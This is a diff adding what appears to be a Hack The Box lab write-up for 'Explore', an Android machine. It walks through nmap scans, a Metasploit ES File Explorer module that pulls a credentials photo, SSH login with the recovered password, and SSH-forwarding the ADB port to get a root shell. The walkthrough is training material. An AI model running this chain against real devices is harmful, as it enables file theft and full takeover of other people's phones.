@@ -1,0 +1,125 @@
+                          Explore
+
+                          25th October 2021 / Document No D21.100.138
+                          Prepared By: bertolis
+                          Machine Author: bertolis
+                          Difficulty: Easy
+
+Classification: Official
+Synopsis
+
+Explore is an easy difficulty Android machine. Network enumeration reveals a vulnerable service that is
+exploitable via a Metasploit module, and gives restricted read access to the machine. Further enumeration
+of the files, reveals the SSH credentials of a system user, allowing this way remote access to the machine.
+Finally, the attacker is able to forward a filtered port locally using SSH tunneling, in order to access the
+Android shell over the Android Debug Bridge (ADB). This eventuality allows the attacker to execute
+commands as the root user.
+
+Skills required
+
+      Basic Network/Android Enumeration
+      Basic Metasploit Usage
+
+Skills learned
+
+      Basic Android Exploitation
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.247 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.247
+
+Nmap reveals an SSH server running on port 2222, an HTTP service running on port 59777, and a filtered
+TCP service running on port 5555. Searching online for port 5555 , we get the following as the first result.
+
+This website shows known port assignments and vulnerabilities.
+In the above snippet we can see that the port 5555 is being used by the Android Debug Bridge (ADB).
+Android Debug Bridge (adb) is a command-line tool that allows users to communicate with an Android
+device.
+Initial Foothold
+
+As the port 5555 is filtered and it is not possible to connect through adb we search online for port 59777
+that reveals the following as a first result.
+
+This port is used by ES File Explorer File Manager application for Android, according to this website.
+
+This website also indicates a known vulnerability for this application, in which an attacker is able to execute
+arbitrary commands to the host. Searching the metasploit framework reveals a module for this
+vulnerability.
+
+   msfconsole
+   search es file explorer
+Let's use this module and then list its options.
+
+   use auxiliary/scanner/http/es_file_explorer_open_port
+   options
+Next, we set the RHOSTS parameter with the IP of the host, and type exploit .
+
+   set RHOSTS 10.10.10.247
+   exploit
+This is successful. The parameter action was set by default to GETDEVICEINFO and thus, the output shows
+some information about the device. Let's list all the actions of this module.
+
+   show actions
+
+Setting the action to LISTPICS , we get the following results.
+   set action LISTPICS
+   exploit
+This instruction seems to list all the images stored in the DCIM directory of the phone. It is quite often for
+someone to take a picture of something in order to remember it. Let's set the action to GETFILE and
+download the file creds.jpg .
+
+   set action GETFILE
+   set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
+   exploit
+Next, we can open the image by using the image viewer feh .
+   sudo apt install feh
+   feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg
+
+This looks like a notebook with the password Kr1sT!5h@Rp3xPl0r3! for the user kristi . Let's use these
+credentials and try to login via SSH on port 2222 that we found earlier.
+
+   ssh kristi@10.10.10.247 -p 2222
+Access to the remote machine via SSH has been acquired as a low privileged user. The user flag is located in
+/storage/emulated/0/user.txt .
+Privilege Escalation
+
+Having access to the remote host over SSH, we can execute the following command to ensure that the
+filtered port 5555 we found earlier, is running.
+
+Since the port 5555 is filtered and we can't reach it remotely via adb , let's try to forward it via SSH and try
+again. Issue the following command in order to forward the port locally, using the password
+Kr1sT!5h@Rp3xPl0r3! once again.
+
+   ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222
+
+The Android Debug Bridge (ADB) tool seems to be available on apt package manager. Let's install it by
+executing the following command. Then we can list the help menu.
+
+   sudo apt install adb
+   adb --help
+On the network section we see that using the instruction connect , we can connect to the Android device.
+We run adb again from our local machine using our local IP.
+
+   adb connect 127.0.0.1:5555
+
+We can list the connected devices by executing the following command.
+   adb devices
+
+Then, we can type the following to get shell on the remote machine.
+   adb shell
+In order for an Android device to allow someone to connect via ADB, the USB debugging option must be
+enabled in the device. In addition, ADB provides the instructions adb root and adb unroot , which allow
+users to connect to the device as the user root or shell accordingly. Executing the following command,
+will start the ADB as user root .
+
+   adb root
+
+Then, we type the following to connect once again.
+   adb shell
+   whoami
+
+The root flag is located in /data/root.txt .
+
